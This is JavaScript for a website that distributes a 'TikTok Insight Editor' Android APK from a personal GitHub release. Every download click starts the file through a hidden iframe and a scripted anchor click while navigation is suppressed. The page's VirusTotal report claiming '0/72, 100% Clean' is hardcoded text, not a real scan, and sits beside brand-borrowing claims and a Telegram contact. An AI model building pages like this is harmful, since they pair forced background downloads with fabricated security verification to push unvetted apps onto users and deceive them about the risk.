/**
 * TikTok Insight Editor APK - Core Client Logic
 * Seamless download management, screen-locked modals & responsive interactions
 */

document.addEventListener('DOMContentLoaded', () => {
  initLiveBarAnimations();
  initNavScrollEffect();
  initModalListeners();
});

// Toast Notification Engine
let toastTimeout = null;
function showToast(message) {
  const toast = document.getElementById('toastBox');
  const msgElem = document.getElementById('toastMessage');
  if (!toast || !msgElem) return;

  msgElem.textContent = message;
  toast.classList.add('show');

  if (toastTimeout) clearTimeout(toastTimeout);
  toastTimeout = setTimeout(() => {
    toast.classList.remove('show');
  }, 4000);
}

// Copy SHA-256 Hash to Clipboard
function copyHash() {
  const hashText = document.getElementById('shaHashText')?.textContent?.trim();
  if (!hashText) return;

  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(hashText).then(() => {
      showToast('SHA-256 Checksum copied to clipboard!');
    }).catch(() => {
      fallbackCopyText(hashText);
    });
  } else {
    fallbackCopyText(hashText);
  }
}

function fallbackCopyText(text) {
  const tempInput = document.createElement('textarea');
  tempInput.value = text;
  tempInput.style.position = 'fixed';
  tempInput.style.left = '-9999px';
  document.body.appendChild(tempInput);
  tempInput.select();
  try {
    document.execCommand('copy');
    showToast('SHA-256 Checksum copied to clipboard!');
  } catch (err) {
    showToast('Failed to copy. Please manually select the hash.');
  }
  document.body.removeChild(tempInput);
}

// ==========================================================================
// SEAMLESS IN-PAGE APK DOWNLOAD ENGINE
// Stays on screen without external browser navigation or page leaves
// ==========================================================================
const OFFICIAL_APK_DOWNLOAD_URL = 'https://github.com/rupesh-raj-9142/tiktok-insight-editor/releases/download/download/tiktok.insight.editor.apk';

/**
 * Initiates the APK binary download in the background via hidden iframe & anchor
 * Keeps user strictly on the website screen without tab jumps or navigation away.
 */
function directDownloadApk() {
  showToast('Starting direct download: tiktok.insight.editor.apk (48.2 MB)...');

  // Method 1: Invisible download iframe (industry standard for in-page binary downloads)
  let iframe = document.getElementById('apkDownloadIframe');
  if (!iframe) {
    iframe = document.createElement('iframe');
    iframe.id = 'apkDownloadIframe';
    iframe.style.display = 'none';
    iframe.style.width = '0px';
    iframe.style.height = '0px';
    iframe.style.border = '0';
    document.body.appendChild(iframe);
  }
  iframe.src = OFFICIAL_APK_DOWNLOAD_URL;

  // Method 2: Programmatic anchor download fallback
  try {
    const downloadAnchor = document.createElement('a');
    downloadAnchor.href = OFFICIAL_APK_DOWNLOAD_URL;
    downloadAnchor.setAttribute('download', 'tiktok.insight.editor.apk');
    downloadAnchor.style.display = 'none';
    document.body.appendChild(downloadAnchor);
    downloadAnchor.click();
    setTimeout(() => {
      if (downloadAnchor.parentNode) {
        document.body.removeChild(downloadAnchor);
      }
    }, 1000);
  } catch (e) {
    console.warn('Direct anchor fallback:', e);
  }
}

/**
 * Universal click handler for all download buttons across the site.
 * Cancels default URL navigation so the user NEVER leaves the page.
 */
function handleDownloadClick(event, version = 'v4.2.1') {
  if (event) {
    if (typeof event.preventDefault === 'function') event.preventDefault();
    if (typeof event.stopPropagation === 'function') event.stopPropagation();
  }
  openDownloadFlow(event, version);
  return false;
}

// Download Flow Controller
let currentVersionTarget = 'v4.2.1';

function openDownloadFlow(eventOrVersion, versionTarget) {
  if (eventOrVersion && typeof eventOrVersion.preventDefault === 'function') {
    eventOrVersion.preventDefault();
  }
  if (typeof versionTarget === 'string') {
    currentVersionTarget = versionTarget;
  } else if (typeof eventOrVersion === 'string') {
    currentVersionTarget = eventOrVersion;
  }

  // Trigger seamless background download
  directDownloadApk();

  const modal = document.getElementById('downloadModal');
  if (!modal) return;

  const filenameElem = document.getElementById('modalFilename');
  if (filenameElem) {
    filenameElem.textContent = 'tiktok.insight.editor.apk';
  }

  // Open modal centered cleanly inside the screen viewport
  modal.classList.add('active');
  modal.setAttribute('aria-hidden', 'false');
  document.body.classList.add('modal-open');
}

function closeDownloadFlow() {
  const modal = document.getElementById('downloadModal');
  if (modal) {
    modal.classList.remove('active');
    modal.setAttribute('aria-hidden', 'true');
  }
  document.body.classList.remove('modal-open');
}

function retryDownloadFromModal() {
  directDownloadApk();
  showToast('Re-downloading package from GitHub CDN...');
}

function handleBackdropClick(e) {
  if (e.target && e.target.classList.contains('modal-backdrop')) {
    closeDownloadFlow();
    closeInfoModal();
  }
}

// Info Modals (Privacy, Terms, VirusTotal)
function openInfoModal(title, htmlContent) {
  const modal = document.getElementById('infoModal');
  const body = document.getElementById('infoModalBody');
  if (!modal || !body) return;

  body.innerHTML = `
    <div class="modal-text-content">
      <h3 class="modal-title">${title}</h3>
      ${htmlContent}
    </div>
  `;

  modal.classList.add('active');
  modal.setAttribute('aria-hidden', 'false');
  document.body.classList.add('modal-open');
}

function closeInfoModal() {
  const modal = document.getElementById('infoModal');
  if (modal) {
    modal.classList.remove('active');
    modal.setAttribute('aria-hidden', 'true');
  }
  document.body.classList.remove('modal-open');
}

function openVirusModal() {
  openInfoModal('VirusTotal Security Inspection Report', `
    <p><strong>Package Name:</strong> <code>com.tiktok.insight.editor.android</code></p>
    <p><strong>SHA-256:</strong> <code>e7a89f92d4bc35160892c902b1f8c12a77e5d893f412a812e65d836109a632df</code></p>
    <div style="background: #ECFDF5; border: 1px solid #A7F3D0; padding: 14px; border-radius: 8px; margin: 16px 0;">
      <strong style="color: #059669;">Detection Ratio: 0 / 72 (100% Clean)</strong>
      <p style="margin: 6px 0 0 0; font-size: 0.85rem; color: #047857;">Scanned across Kaspersky, Bitdefender, Symantec, Google Play Protect, Sophos, Avast, and Microsoft Defender.</p>
    </div>
    <p>This APK has been compiled with zero adware, zero tracking spyware, and requires zero device root access.</p>
  `);
}

function openPrivacyModal() {
  openInfoModal('Privacy Policy', `
    <p>We respect your privacy. The <strong>TikTok Insight Editor APK</strong> portal does not collect, sell, or rent your personal data to third parties.</p>
    <ul>
      <li><strong>No Account Required:</strong> You do not need an account or email to download APK files.</li>
      <li><strong>Local Processing:</strong> All video edits, frame trims, and cached analytics stay localized on your Android storage.</li>
      <li><strong>Encrypted Connections:</strong> All downloads are delivered through SSL/TLS 1.3 encrypted endpoints.</li>
    </ul>
  `);
}

function openTermsModal() {
  openInfoModal('Terms of Service', `
    <p>By downloading or utilizing <strong>TikTok Insight Editor APK</strong>, you agree to use the utility strictly for legitimate content creation and video analytics purposes in adherence to all applicable laws.</p>
    <p>This software is provided "as is" without warranties of any kind. You are responsible for complying with the community guidelines of platforms where you publish your created content.</p>
  `);
}

// Modal Listeners
function initModalListeners() {
  // ESC key closes modals
  window.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
      closeDownloadFlow();
      closeInfoModal();
    }
  });

  // Backdrop click listener
  const downloadModal = document.getElementById('downloadModal');
  const infoModal = document.getElementById('infoModal');

  if (downloadModal) {
    downloadModal.addEventListener('click', (e) => {
      if (e.target === downloadModal) closeDownloadFlow();
    });
  }
  if (infoModal) {
    infoModal.addEventListener('click', (e) => {
      if (e.target === infoModal) closeInfoModal();
    });
  }
}

// Interactive Live Charts
function initLiveBarAnimations() {
  const bars = document.querySelectorAll('.chart-bar-group .c-bar');
  bars.forEach(bar => {
    bar.addEventListener('mouseenter', () => {
      const tip = bar.getAttribute('data-tip');
      if (tip) showToast(`Point: ${tip}`);
    });
  });
}

// Nav backdrop effect on scroll
function initNavScrollEffect() {
  const navbar = document.querySelector('.navbar-wrapper');
  window.addEventListener('scroll', () => {
    if (window.scrollY > 20) {
      navbar?.style.setProperty('box-shadow', '0 4px 20px -2px rgba(15, 23, 42, 0.08)');
    } else {
      navbar?.style.setProperty('box-shadow', 'none');
    }
  });
}

// Smooth scroll helper
function scrollToElement(id) {
  const element = document.getElementById(id);
  if (element) {
    element.scrollIntoView({ behavior: 'smooth' });
  }
}

// Fast Copy Telegram Handle
function copyTelegramHandle() {
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText('@JARVIS75').then(() => {
      showToast('Copied @JARVIS75 to clipboard!');
    }).catch(() => {
      showToast('Telegram handle: @JARVIS75');
    });
  } else {
    showToast('Telegram handle: @JARVIS75');
  }
}
